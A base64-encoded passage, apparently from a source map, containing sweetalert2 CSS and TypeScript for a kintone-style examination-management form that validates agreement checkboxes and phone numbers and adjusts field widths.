c3OGM0O2NvbG9yOiNmZmY7bGluZS1oZWlnaHQ6MmVtO3RleHQtYWxpZ246Y2VudGVyfS5zd2FsMi1wcm9ncmVzcy1zdGVwcyAuc3dhbDItcHJvZ3Jlc3Mtc3RlcC5zd2FsMi1hY3RpdmUtcHJvZ3Jlc3Mtc3RlcHtiYWNrZ3JvdW5kOiMyNzc4YzR9LnN3YWwyLXByb2dyZXNzLXN0ZXBzIC5zd2FsMi1wcm9ncmVzcy1zdGVwLnN3YWwyLWFjdGl2ZS1wcm9ncmVzcy1zdGVwfi5zd2FsMi1wcm9ncmVzcy1zdGVwe2JhY2tncm91bmQ6I2FkZDhlNjtjb2xvcjojZmZmfS5zd2FsMi1wcm9ncmVzcy1zdGVwcyAuc3dhbDItcHJvZ3Jlc3Mtc3RlcC5zd2FsMi1hY3RpdmUtcHJvZ3Jlc3Mtc3RlcH4uc3dhbDItcHJvZ3Jlc3Mtc3RlcC1saW5le2JhY2tncm91bmQ6I2FkZDhlNn0uc3dhbDItcHJvZ3Jlc3Mtc3RlcHMgLnN3YWwyLXByb2dyZXNzLXN0ZXAtbGluZXt6LWluZGV4OjEwO2ZsZXgtc2hyaW5rOjA7d2lkdGg6Mi41ZW07aGVpZ2h0Oi40ZW07bWFyZ2luOjAgLTFweDtiYWNrZ3JvdW5kOiMyNzc4YzR9W2NsYXNzXj1zd2FsMl17LXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOnJnYmEoMCwwLDAsMCl9LnN3YWwyLXNob3d7YW5pbWF0aW9uOnN3YWwyLXNob3cgLjNzfS5zd2FsMi1oaWRle2FuaW1hdGlvbjpzd2FsMi1oaWRlIC4xNXMgZm9yd2FyZHN9LnN3YWwyLW5vYW5pbWF0aW9ue3RyYW5zaXRpb246bm9uZX0uc3dhbDItc2Nyb2xsYmFyLW1lYXN1cmV7cG9zaXRpb246YWJzb2x1dGU7dG9wOi05OTk5cHg7d2lkdGg6NTBweDtoZWlnaHQ6NTBweDtvdmVyZmxvdzpzY3JvbGx9LnN3YWwyLXJ0bCAuc3dhbDItY2xvc2V7bWFyZ2luLXJpZ2h0OmluaXRpYWw7bWFyZ2luLWxlZnQ6MH0uc3dhbDItcnRsIC5zd2FsMi10aW1lci1wcm9ncmVzcy1iYXJ7cmlnaHQ6MDtsZWZ0OmF1dG99QGtleWZyYW1lcyBzd2FsMi10b2FzdC1zaG93ezAle3RyYW5zZm9ybTp0cmFuc2xhdGVZKC0wLjYyNWVtKSByb3RhdGVaKDJkZWcpfTMzJXt0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKSByb3RhdGVaKC0yZGVnKX02NiV7dHJhbnNmb3JtOnRyYW5zbGF0ZVkoMC4zMTI1ZW0pIHJvdGF0ZVooMmRlZyl9MTAwJXt0cmFuc2Zvcm06dHJhbnNsYXRlWSgwKSByb3RhdGVaKDBkZWcpfX1Aa2V5ZnJhbWVzIHN3YWwyLXRvYXN0LWhpZGV7MTAwJXt0cmFuc2Zvcm06cm90YXRlWigxZGVnKTtvcGFjaXR5OjB9fUBrZXlmcmFtZXMgc3dhbDItdG9hc3QtYW5pbWF0ZS1zdWNjZXNzLWxpbmUtdGlwezAle3RvcDouNTYyNWVtO2xlZnQ6LjA2MjVlbTt3aWR0aDowfTU0JXt0b3A6LjEyNWVtO2xlZnQ6LjEyNWVtO3dpZHRoOjB9NzAle3RvcDouNjI1ZW07bGVmdDotMC4yNWVtO3dpZHRoOjEuNjI1ZW19ODQle3RvcDoxLjA2MjVlbTtsZWZ0Oi43NWVtO3dpZHRoOi41ZW19MTAwJXt0b3A6MS4xMjVlbTtsZWZ0Oi4xODc1ZW07d2lkdGg6Ljc1ZW19fUBrZXlmcmFtZXMgc3dhbDItdG9hc3QtYW5pbWF0ZS1zdWNjZXNzLWxpbmUtbG9uZ3swJXt0b3A6MS42MjVlbTtyaWdodDoxLjM3NWVtO3dpZHRoOjB9NjUle3RvcDoxLjI1ZW07cmlnaHQ6LjkzNzVlbTt3aWR0aDowfTg0JXt0b3A6LjkzNzVlbTtyaWdodDowO3dpZHRoOjEuMTI1ZW19MTAwJXt0b3A6LjkzNzVlbTtyaWdodDouMTg3NWVtO3dpZHRoOjEuMzc1ZW19fUBrZXlmcmFtZXMgc3dhbDItc2hvd3swJXt0cmFuc2Zvcm06c2NhbGUoMC43KX00NSV7dHJhbnNmb3JtOnNjYWxlKDEuMDUpfTgwJXt0cmFuc2Zvcm06c2NhbGUoMC45NSl9MTAwJXt0cmFuc2Zvcm06c2NhbGUoMSl9fUBrZXlmcmFtZXMgc3dhbDItaGlkZXswJXt0cmFuc2Zvcm06c2NhbGUoMSk7b3BhY2l0eToxfTEwMCV7dHJhbnNmb3JtOnNjYWxlKDAuNSk7b3BhY2l0eTowfX1Aa2V5ZnJhbWVzIHN3YWwyLWFuaW1hdGUtc3VjY2Vzcy1saW5lLXRpcHswJXt0b3A6MS4xODc1ZW07bGVmdDouMDYyNWVtO3dpZHRoOjB9NTQle3RvcDoxLjA2MjVlbTtsZWZ0Oi4xMjVlbTt3aWR0aDowfTcwJXt0b3A6Mi4xODc1ZW07bGVmdDotMC4zNzVlbTt3aWR0aDozLjEyNWVtfTg0JXt0b3A6M2VtO2xlZnQ6MS4zMTI1ZW07d2lkdGg6MS4wNjI1ZW19MTAwJXt0b3A6Mi44MTI1ZW07bGVmdDouODEyNWVtO3dpZHRoOjEuNTYyNWVtfX1Aa2V5ZnJhbWVzIHN3YWwyLWFuaW1hdGUtc3VjY2Vzcy1saW5lLWxvbmd7MCV7dG9wOjMuMzc1ZW07cmlnaHQ6Mi44NzVlbTt3aWR0aDowfTY1JXt0b3A6My4zNzVlbTtyaWdodDoyLjg3NWVtO3dpZHRoOjB9ODQle3RvcDoyLjE4NzVlbTtyaWdodDowO3dpZHRoOjMuNDM3NWVtfTEwMCV7dG9wOjIuMzc1ZW07cmlnaHQ6LjVlbTt3aWR0aDoyLjkzNzVlbX19QGtleWZyYW1lcyBzd2FsMi1yb3RhdGUtc3VjY2Vzcy1jaXJjdWxhci1saW5lezAle3RyYW5zZm9ybTpyb3RhdGUoLTQ1ZGVnKX01JXt0cmFuc2Zvcm06cm90YXRlKC00NWRlZyl9MTIle3RyYW5zZm9ybTpyb3RhdGUoLTQwNWRlZyl9MTAwJXt0cmFuc2Zvcm06cm90YXRlKC00MDVkZWcpfX1Aa2V5ZnJhbWVzIHN3YWwyLWFuaW1hdGUtZXJyb3IteC1tYXJrezAle21hcmdpbi10b3A6MS42MjVlbTt0cmFuc2Zvcm06c2NhbGUoMC40KTtvcGFjaXR5OjB9NTAle21hcmdpbi10b3A6MS42MjVlbTt0cmFuc2Zvcm06c2NhbGUoMC40KTtvcGFjaXR5OjB9ODAle21hcmdpbi10b3A6LTAuMzc1ZW07dHJhbnNmb3JtOnNjYWxlKDEuMTUpfTEwMCV7bWFyZ2luLXRvcDowO3RyYW5zZm9ybTpzY2FsZSgxKTtvcGFjaXR5OjF9fUBrZXlmcmFtZXMgc3dhbDItYW5pbWF0ZS1lcnJvci1pY29uezAle3RyYW5zZm9ybTpyb3RhdGVYKDEwMGRlZyk7b3BhY2l0eTowfTEwMCV7dHJhbnNmb3JtOnJvdGF0ZVgoMGRlZyk7b3BhY2l0eToxfX1Aa2V5ZnJhbWVzIHN3YWwyLXJvdGF0ZS1sb2FkaW5nezAle3RyYW5zZm9ybTpyb3RhdGUoMGRlZyl9MTAwJXt0cmFuc2Zvcm06cm90YXRlKDM2MGRlZyl9fUBrZXlmcmFtZXMgc3dhbDItYW5pbWF0ZS1xdWVzdGlvbi1tYXJrezAle3RyYW5zZm9ybTpyb3RhdGVZKC0zNjBkZWcpfTEwMCV7dHJhbnNmb3JtOnJvdGF0ZVkoMCl9fUBrZXlmcmFtZXMgc3dhbDItYW5pbWF0ZS1pLW1hcmt7MCV7dHJhbnNmb3JtOnJvdGF0ZVooNDVkZWcpO29wYWNpdHk6MH0yNSV7dHJhbnNmb3JtOnJvdGF0ZVooLTI1ZGVnKTtvcGFjaXR5Oi40fTUwJXt0cmFuc2Zvcm06cm90YXRlWigxNWRlZyk7b3BhY2l0eTouOH03NSV7dHJhbnNmb3JtOnJvdGF0ZVooLTVkZWcpO29wYWNpdHk6MX0xMDAle3RyYW5zZm9ybTpyb3RhdGVYKDApO29wYWNpdHk6MX19Ym9keS5zd2FsMi1zaG93bjpub3QoLnN3YWwyLW5vLWJhY2tkcm9wKTpub3QoLnN3YWwyLXRvYXN0LXNob3duKXtvdmVyZmxvdzpoaWRkZW59Ym9keS5zd2FsMi1oZWlnaHQtYXV0b3toZWlnaHQ6YXV0byAhaW1wb3J0YW50fWJvZHkuc3dhbDItbm8tYmFja2Ryb3AgLnN3YWwyLWNvbnRhaW5lcntiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMCwwLDAsMCkgIWltcG9ydGFudDtwb2ludGVyLWV2ZW50czpub25lfWJvZHkuc3dhbDItbm8tYmFja2Ryb3AgLnN3YWwyLWNvbnRhaW5lciAuc3dhbDItcG9wdXB7cG9pbnRlci1ldmVudHM6YWxsfWJvZHkuc3dhbDItbm8tYmFja2Ryb3AgLnN3YWwyLWNvbnRhaW5lciAuc3dhbDItbW9kYWx7Ym94LXNoYWRvdzowIDAgMTBweCByZ2JhKDAsMCwwLC40KX1AbWVkaWEgcHJpbnR7Ym9keS5zd2FsMi1zaG93bjpub3QoLnN3YWwyLW5vLWJhY2tkcm9wKTpub3QoLnN3YWwyLXRvYXN0LXNob3duKXtvdmVyZmxvdy15OnNjcm9sbCAhaW1wb3J0YW50fWJvZHkuc3dhbDItc2hvd246bm90KC5zd2FsMi1uby1iYWNrZHJvcCk6bm90KC5zd2FsMi10b2FzdC1zaG93bik+W2FyaWEtaGlkZGVuPXRydWVde2Rpc3BsYXk6bm9uZX1ib2R5LnN3YWwyLXNob3duOm5vdCguc3dhbDItbm8tYmFja2Ryb3ApOm5vdCguc3dhbDItdG9hc3Qtc2hvd24pIC5zd2FsMi1jb250YWluZXJ7cG9zaXRpb246c3RhdGljICFpbXBvcnRhbnR9fWJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lcntib3gtc2l6aW5nOmJvcmRlci1ib3g7d2lkdGg6MzYwcHg7bWF4LXdpZHRoOjEwMCU7YmFja2dyb3VuZC1jb2xvcjpyZ2JhKDAsMCwwLDApO3BvaW50ZXItZXZlbnRzOm5vbmV9Ym9keS5zd2FsMi10b2FzdC1zaG93biAuc3dhbDItY29udGFpbmVyLnN3YWwyLXRvcHtpbnNldDowIGF1dG8gYXV0byA1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSl9Ym9keS5zd2FsMi10b2FzdC1zaG93biAuc3dhbDItY29udGFpbmVyLnN3YWwyLXRvcC1lbmQsYm9keS5zd2FsMi10b2FzdC1zaG93biAuc3dhbDItY29udGFpbmVyLnN3YWwyLXRvcC1yaWdodHtpbnNldDowIDAgYXV0byBhdXRvfWJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi10b3Atc3RhcnQsYm9keS5zd2FsMi10b2FzdC1zaG93biAuc3dhbDItY29udGFpbmVyLnN3YWwyLXRvcC1sZWZ0e2luc2V0OjAgYXV0byBhdXRvIDB9Ym9keS5zd2FsMi10b2FzdC1zaG93biAuc3dhbDItY29udGFpbmVyLnN3YWwyLWNlbnRlci1zdGFydCxib2R5LnN3YWwyLXRvYXN0LXNob3duIC5zd2FsMi1jb250YWluZXIuc3dhbDItY2VudGVyLWxlZnR7aW5zZXQ6NTAlIGF1dG8gYXV0byAwO3RyYW5zZm9ybTp0cmFuc2xhdGVZKC01MCUpfWJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi1jZW50ZXJ7aW5zZXQ6NTAlIGF1dG8gYXV0byA1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZSgtNTAlLCAtNTAlKX1ib2R5LnN3YWwyLXRvYXN0LXNob3duIC5zd2FsMi1jb250YWluZXIuc3dhbDItY2VudGVyLWVuZCxib2R5LnN3YWwyLXRvYXN0LXNob3duIC5zd2FsMi1jb250YWluZXIuc3dhbDItY2VudGVyLXJpZ2h0e2luc2V0OjUwJSAwIGF1dG8gYXV0bzt0cmFuc2Zvcm06dHJhbnNsYXRlWSgtNTAlKX1ib2R5LnN3YWwyLXRvYXN0LXNob3duIC5zd2FsMi1jb250YWluZXIuc3dhbDItYm90dG9tLXN0YXJ0LGJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi1ib3R0b20tbGVmdHtpbnNldDphdXRvIGF1dG8gMCAwfWJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi1ib3R0b217aW5zZXQ6YXV0byBhdXRvIDAgNTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpfWJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi1ib3R0b20tZW5kLGJvZHkuc3dhbDItdG9hc3Qtc2hvd24gLnN3YWwyLWNvbnRhaW5lci5zd2FsMi1ib3R0b20tcmlnaHR7aW5zZXQ6YXV0byAwIDAgYXV0b31cIik7IiwgImV4cG9ydCBuYW1lc3BhY2UgRXhhbWluYXRpb25NYW5hZ2VtZW50QXBwIHtcbiAgZXhwb3J0IGNvbnN0IHNjcmVlbkFkZFJlY29yZCA9IFwiL2FkZF9yZWNvcmQuaHRtbFwiO1xuXHRleHBvcnQgY29uc3QgYWxsb3dlZFNjcmVlbnMgPSBbXG4gICAgXCIvYWRkX3JlY29yZC5odG1sXCIsXG4gICAgXCIvZGV0YWlsX3JlY29yZC5odG1sXCIsXG4gIF07XG5cdGV4cG9ydCBjb25zdCBhZ3JlZW1lbnQxID0gXCJcdTU0MENcdTYxMEZcdTRFOEJcdTk4MDUxXCI7XG5cdGV4cG9ydCBjb25zdCBhZ3JlZW1lbnQyID0gXCJcdTU0MENcdTYxMEZcdTRFOEJcdTk4MDVfMlwiO1xuXHRleHBvcnQgY29uc3QgcGhvbmVOdW1iZXJJZCA9IFwiXHU5NkZCXHU4QTcxXHU3NTZBXHU1M0Y3X2Nob2JpaXRcdTg4NjhcdTc5M0FcdTc1MjhcIjtcblxuXHRleHBvcnQgY29uc3QgbGlzdElkRmllbGRVc2luZ1NldE1heFdpZHRoID0gW1xuXHRcdFwiXHU3NTMzXHU4QUNCXHU1MTg1XHU1QkI5X1x1MzBCMFx1MzBFQlx1MzBGQ1x1MzBENzFcIixcblx0XHRcIlx1NzUzM1x1OEFDQlx1NTE4NVx1NUJCOV9cdTMwQjBcdTMwRUJcdTMwRkNcdTMwRDcyXCIsXG5cdFx0XCJcdTc1MzNcdThBQ0JcdTUxODVcdTVCQjlfXHUzMEIwXHUzMEVCXHUzMEZDXHUzMEQ3M1wiLFxuXHRdO1xuXG5cdGV4cG9ydCBjb25zdCBidXR0b25TdWJtaXQgPSBcInN1Ym1pdEJ0blwiO1xuXHRleHBvcnQgY29uc3QgYnV0dG9uRWRpdFN1Ym1pdCA9IFwic3VibWl0RWRpdEJ0blwiO1xuXHRleHBvcnQgY29uc3QgY2xvbmVkQnV0dG9uU3VibWl0ID0gXCJjbG9uZWRTdWJtaXRCdG5cIjtcblx0ZXhwb3J0IGNvbnN0IGNsb25lZEJ1dHRvbkVkaXRTdWJtaXQgPSBcImNsb25lZFN1Ym1pdEVkaXRCdG5cIjtcbn1cbiIsICJpbXBvcnQgU3dhbCBmcm9tIFwic3dlZXRhbGVydDJcIjtcblxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgUG9wdXAge1xuXHQvKipcblx0ICogIFNob3cgcG9wdXAgZXJyb3Jcblx0ICogQHBhcmFtIG1lc3NhZ2VzXG5cdCAqL1xuXHRzdGF0aWMgc2hvd1BvcHVwRXJyb3IobWVzc2FnZXM6IHN0cmluZykge1xuXHRcdFN3YWwuZmlyZSh7XG5cdFx0XHRpY29uOiBcImVycm9yXCIsXG5cdFx0XHR0aXRsZTogXCJcdTMwQThcdTMwRTlcdTMwRkNcIixcblx0XHRcdGNvbmZpcm1CdXR0b25Db2xvcjogXCIjN2NkMWY5XCIsXG5cdFx0XHRodG1sOiBtZXNzYWdlcyxcblx0XHR9KTtcblx0fVxufVxuIiwgIi8qKlxuICogR2V0IGlmcmFtZSB0YWdcbiAqL1xuZXhwb3J0IGNvbnN0IGdldElmcmFtZVRhZyA9ICgpID0+IHtcblx0Y29uc3QgaWZyYW1lSWQgPSBkb2N1bWVudD8uZ2V0RWxlbWVudEJ5SWQoXCJpZnJhbWVcIikgYXMgSFRNTElGcmFtZUVsZW1lbnQ7XG5cdHJldHVybiBpZnJhbWVJZC5jb250ZW50V2luZG93Py5kb2N1bWVudDtcbn07XG5cbi8qKlxuICogQ2hlY2sgaXMgdmFsaWQgcGhvbmUgbnVtYmVyXG4gKiBAcGFyYW0gcGhvbmVOdW1iZXJcbiAqL1xuZXhwb3J0IGNvbnN0IGlzVmFsaWRQaG9uZU51bWJlciA9IChwaG9uZU51bWJlcjogc3RyaW5nKSA9PiB7XG5cdGNvbnN0IHBob25lUGF0dGVybiA9IC9eWzAtOV17MTEsMTJ9JC87XG5cdHJldHVybiBwaG9uZVBhdHRlcm4udGVzdChwaG9uZU51bWJlcik7XG59O1xuIiwgImltcG9ydCB7RXhhbWluYXRpb25NYW5hZ2VtZW50QXBwfSBmcm9tIFwiLi4vZG9tYWluL2V4YW1pbmF0aW9uLW1hbmFnZW1lbnQtYXBwXCI7XG5pbXBvcnQgUG9wdXAgZnJvbSBcIi4uL3VpL3BvcHVwXCI7XG5pbXBvcnQgeyBnZXRJZnJhbWVUYWcsIGlzVmFsaWRQaG9uZU51bWJlciB9IGZyb20gXCIuLi8uLi8uLi91dGlsc1wiO1xuXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFeGFtaW5hdGlvbk1hbmFnZW1lbnRXcmFwcGVyIHtcblx0LyoqXG5cdCAqIENsb25lIGJ1dHRvbiBzdWJtaXRcblx0ICovXG5cdHB1YmxpYyBjbG9uZUJ1dHRvblN1Ym1pdChcbiAgICBzY3JlZW46IHN0cmluZ1xuICApIHtcblx0XHRjb25zdCBzdWJtaXRCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChcbiAgICAgIHNjcmVlbiA9PT0gRXhhbWluYXRpb25NYW5hZ2VtZW50QXBwLnNjcmVlbkFkZFJlY29yZFxuICAgICAgICA/IEV4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5idXR0b25TdWJtaXRcbiAgICAgICAgOiBFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAuYnV0dG9uRWRpdFN1Ym1pdFxuXHRcdCk7XG5cdFx0aWYgKCFzdWJtaXRCdG4pIHJldHVybjtcblxuXHRcdC8vIGNsb25lIGJ1dHRvbiBzdWJtaXQgd2l0aCB0aGUgcHVycG9zZSBvZiBjdXN0b21pemluZyB0aGUgY2xpY2sgZXZlbnRcblx0XHRjb25zdCBjbG9uZWRTdWJtaXRCdG4gPSBzdWJtaXRCdG4uY2xvbmVOb2RlKHRydWUpIGFzIEhUTUxFbGVtZW50O1xuXHRcdGNsb25lZFN1Ym1pdEJ0bi5pZCA9IHNjcmVlbiA9PT0gRXhhbWluYXRpb25NYW5hZ2VtZW50QXBwLnNjcmVlbkFkZFJlY29yZFxuICAgICAgPyBFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAuY2xvbmVkQnV0dG9uU3VibWl0XG4gICAgICA6IEV4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5jbG9uZWRCdXR0b25FZGl0U3VibWl0O1xuXG5cdFx0Ly8gSGlkZSBidXR0b24gc3VibWl0IGN1cnJlbnRcblx0XHRzdWJtaXRCdG4uc3R5bGUuZGlzcGxheSA9IFwibm9uZVwiO1xuXHRcdGNvbnN0IGVkaXRNZW51ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCJlZGl0TWVudVwiKTtcblx0XHRpZiAoIWVkaXRNZW51KSByZXR1cm47XG5cblx0XHRlZGl0TWVudS5hcHBlbmRDaGlsZChjbG9uZWRTdWJtaXRCdG4pO1xuXHR9XG5cblx0LyoqXG5cdCAqIFZhbGlkYXRlIHBob25lIG51bWJlclxuXHQgKi9cblx0cHVibGljIHZhbGlkYXRlUGhvbmVOdW1iZXIoXG4gICAgc2NyZWVuOiBzdHJpbmdcbiAgKSB7XG5cdFx0Y29uc3QgaWZyYW1lVGFnID0gZ2V0SWZyYW1lVGFnKCk7XG5cdFx0aWYgKCFpZnJhbWVUYWcpIHJldHVybjtcblxuXHRcdGNvbnN0IGJ1dHRvblN1Ym1pdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKFxuICAgICAgc2NyZWVuID09PSBFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAuc2NyZWVuQWRkUmVjb3JkXG4gICAgICAgID8gRXhhbWluYXRpb25NYW5hZ2VtZW50QXBwLmNsb25lZEJ1dHRvblN1Ym1pdFxuICAgICAgICA6IEV4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5jbG9uZWRCdXR0b25FZGl0U3VibWl0XG5cdFx0KTtcblx0XHRpZiAoIWJ1dHRvblN1Ym1pdCkgcmV0dXJuO1xuXG5cdFx0YnV0dG9uU3VibWl0Lm9uY2xpY2sgPSAoKSA9PiB7XG5cdFx0XHRsZXQgZXJyb3JzID0gXCJcIjtcblxuXHRcdFx0Y29uc3QgYWdyZWVtZW50RWxlbWVudDEgPSBpZnJhbWVUYWcucXVlcnlTZWxlY3Rvcihcblx0XHRcdFx0YC5maWVsZC0ke0V4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5hZ3JlZW1lbnQxfSBpbnB1dGBcblx0XHRcdCkgYXMgSFRNTElucHV0RWxlbWVudDtcbiAgICAgIGNvbnNvbGUubG9nKGFncmVlbWVudEVsZW1lbnQxKTtcblx0XHRcdGlmICghYWdyZWVtZW50RWxlbWVudDEpIHJldHVybjtcblxuXHRcdFx0Y29uc3QgYWdyZWVtZW50RWxlbWVudDIgPSBpZnJhbWVUYWcucXVlcnlTZWxlY3RvcihcbiAgICAgICAgYC5maWVsZC0ke0V4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5hZ3JlZW1lbnQyfSBpbnB1dGBcblx0XHRcdCkgYXMgSFRNTElucHV0RWxlbWVudDtcblx0XHRcdGlmICghYWdyZWVtZW50RWxlbWVudDIpIHJldHVybjtcblxuXHRcdFx0Y29uc3QgcGhvbmVOdW1iZXJFbGVtZW50ID0gaWZyYW1lVGFnLnF1ZXJ5U2VsZWN0b3IoXG4gICAgICAgIGAuZmllbGQtJHtFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAucGhvbmVOdW1iZXJJZH0gaW5wdXRgXG5cdFx0XHQpIGFzIEhUTUxJbnB1dEVsZW1lbnQ7XG5cdFx0XHRpZiAoIXBob25lTnVtYmVyRWxlbWVudCkgcmV0dXJuO1xuXG5cdFx0XHRpZiAoXG5cdFx0XHRcdCFhZ3JlZW1lbnRFbGVtZW50MS5jaGVja2VkIHx8XG5cdFx0XHRcdCFhZ3JlZW1lbnRFbGVtZW50Mi5jaGVja2VkIHx8XG5cdFx0XHRcdHBob25lTnVtYmVyRWxlbWVudC52YWx1ZSA9PT0gXCJcIlxuXHRcdFx0KSB7XG5cdFx0XHRcdGVycm9ycyA9IFwiXHU1MTY1XHU1MjlCXHU1MTg1XHU1QkI5XHUzMDRDXHU0RTBEXHU4REIzXHUzMDU3XHUzMDY2XHUzMDRBXHUzMDhBXHUzMDdFXHUzMDU5XHUzMDAyXCI7XG5cdFx0XHR9XG5cblx0XHRcdGlmICghYWdyZWVtZW50RWxlbWVudDEuY2hlY2tlZCB8fCAhYWdyZWVtZW50RWxlbWVudDIuY2hlY2tlZCkge1xuXHRcdFx0XHRlcnJvcnMgKz0gXCI8YnI+XHUzMEZCXHU1NDBDXHU2MTBGXHU0RThCXHU5ODA1XCI7XG5cdFx0XHR9XG5cblx0XHRcdGlmIChwaG9uZU51bWJlckVsZW1lbnQudmFsdWUgPT09IFwiXCIpIHtcblx0XHRcdFx0ZXJyb3JzICs9IFwiPGJyPlx1MzBGQlx1OTZGQlx1OEE3MVx1NzU2QVx1NTNGN1wiO1xuXHRcdFx0fVxuXG5cdFx0XHRpZiAoXG5cdFx0XHRcdCFlcnJvcnMgJiZcblx0XHRcdFx0cGhvbmVOdW1iZXJFbGVtZW50LnZhbHVlICE9PSBcIlwiICYmXG5cdFx0XHRcdCFpc1ZhbGlkUGhvbmVOdW1iZXIocGhvbmVOdW1iZXJFbGVtZW50LnZhbHVlKVxuXHRcdFx0KSB7XG5cdFx0XHRcdGVycm9ycyA9IGBcdTUxNjVcdTUyOUJcdTMwNTVcdTMwOENcdTMwNUZcdTk2RkJcdThBNzFcdTc1NkFcdTUzRjdcdTMwNkVcdTVGNjJcdTVGMEZcdTMwNENcdTZCNjNcdTMwNTdcdTMwNEZcdTMwNDJcdTMwOEFcdTMwN0VcdTMwNUJcdTMwOTNcdTMwMDJcbiAgICAgICAgICAgICAgICA8YnI+LSBcdTUzNEFcdTg5RDJcdTY1NzBcdTVCNTdcdTMwNjdcdTUxNjVcdTUyOUJcdTMwNTdcdTMwNjZcdTMwNEZcdTMwNjBcdTMwNTVcdTMwNDRcdTMwMDJcbiAgICAgICAgICAgICAgICA8YnI+LSBcdTk2RkJcdThBNzFcdTc1NkFcdTUzRjdcdTMwNkYxMX4xMlx1Njg0MVx1MzA2N1x1MzA0Mlx1MzA4Qlx1NUZDNVx1ODk4MVx1MzA0Q1x1MzA0Mlx1MzA4QVx1MzA3RVx1MzA1OVx1MzAwMlxuICAgICAgICAgICAgICAgIDxicj4tIFx1MzAwQy1cdTMwMERcdThBMThcdTUzRjdcdTMwNkZcdTRFMERcdTg5ODFcdTMwNjdcdTMwNTlcdTMwMDJgO1xuXHRcdFx0fVxuXG5cdFx0XHRpZiAoZXJyb3JzKSB7XG5cdFx0XHRcdFBvcHVwLnNob3dQb3B1cEVycm9yKGVycm9ycyk7XG5cdFx0XHRcdHJldHVybjtcblx0XHRcdH1cblx0XHRcdGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKFxuICAgICAgICBzY3JlZW4gPT09IEV4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5zY3JlZW5BZGRSZWNvcmRcbiAgICAgICAgPyBFeGFtaW5hdGlvbk1hbmFnZW1lbnRBcHAuYnV0dG9uU3VibWl0XG4gICAgICAgIDogRXhhbWluYXRpb25NYW5hZ2VtZW50QXBwLmJ1dHRvbkVkaXRTdWJtaXRcbiAgICAgICk/LmNsaWNrKCk7XG5cdFx0fTtcblx0fVxuXG5cdC8qKlxuXHQgKiBTZXQgbWF4IHdpZHRoIGJ5IHNwZWNpZmllZCBlbGVtZW50XG5cdCAqL1xuXHRwdWJsaWMgc2V0TWF4V2lkdGhCeVNwZWNpZmllZEVsZW1lbnQoKSB7XG5cdFx0Y29uc3QgaWZyYW1lVGFnID0gZ2V0SWZyYW1lVGFnKCk7XG5cdFx0aWYgKCFpZnJhbWVUYWcpIHJldHVybjtcblxuXHRcdEV4YW1pbmF0aW9uTWFuYWdlbWVudEFwcC5saXN0SWRGaWVsZFVzaW5nU2V0TWF4V2lkdGguZm9yRWFjaCgoaWRGaWVsZCkgPT4ge1xuXHRcdFx0Y29uc3QgZmllbGRzSW5zaWRlSWZyYW1lID0gaWZyYW1lVGFnLnF1ZXJ5U2VsZWN0b3JBbGw8SFRNTEVsZW1lbnQ+KFxuXHRcdFx0XHRgIyR7aWRGaWVsZH0gLmtpbnRvbmUtZmllbGQtc3R5bGVgLFxuXHRcdFx0KTtcblxuXHRcdFx0ZmllbGRzSW5zaWRlSWZyYW1lLmZvckVhY2goKGZpZWxkc0luc2lkZSkgPT4ge1xuXHRcdFx0XHRjb25zdCBmaWVsZCA9IHdpbmRvdy5nZXRDb21wdXRlZFN0eWxlKGZpZWxkc0luc2lkZSk7XG5cdFx0XHRcdGNvbnN0IHdpZHRoID0gZmllbGQuZ2V0UHJvcGVydHlWYWx1ZShcIndpZHRoXCIpO1xuXG5cdFx0XHRcdC8vIHdpZHRoIGlzIDM3MCBzbyB0aGF0IHRoZSB0ZXh0IGF1dG9tYXRpY2FsbHkgZ29lcyBkb3duIHRoZSBsaW5lXG5cdFx0XHRcdGlmICh3aWR0aCAmJiBwYXJzZUludCh3aWR0aCkgPiAzNzApIHtcblx0XHRcdFx0XHRmaWVsZHNJbnNpZGUuc3R5bGUubWF4V2lkdGggPSB3aWR0aDtcblx0XHRcdFx0XHRmaWVsZHNJbnNpZGUuc3R5bGUud2lkdGggPSBcImF1dG9cIjtcblx0XHRcdFx0fVxuXG5cdFx0XHRcdGNvbnN0IGRpdnNJbnNpZGVGaWVsZCA9IGZpZWxkc0luc2lkZS5xdWVyeVNlbGVjdG9yQWxsKFwiZGl2XCIpO1xuXHRcdFx0XHRkaXZzSW5zaWRlRmllbGQuZm9yRWFjaCgoZGl2c0luc2lkZSkgPT4ge1xuXHRcdFx0XHRcdGNvbnN0IGRpdkZpZWxkID0gd2luZG93LmdldENvbXB1dGVkU3R5bGUoZGl2c0luc2lkZSk7XG5cdFx0XHRcdFx0Y29uc3Qgd2lkdGhEaXYgPSBkaXZGaWVsZC5nZXRQcm9wZXJ0eVZhbHVlKFwid2lkdGhcIik7XG5cblx0XHRcdFx0XHQvLyB3aWR0aCBpcyAzNTAgc28gdGhhdC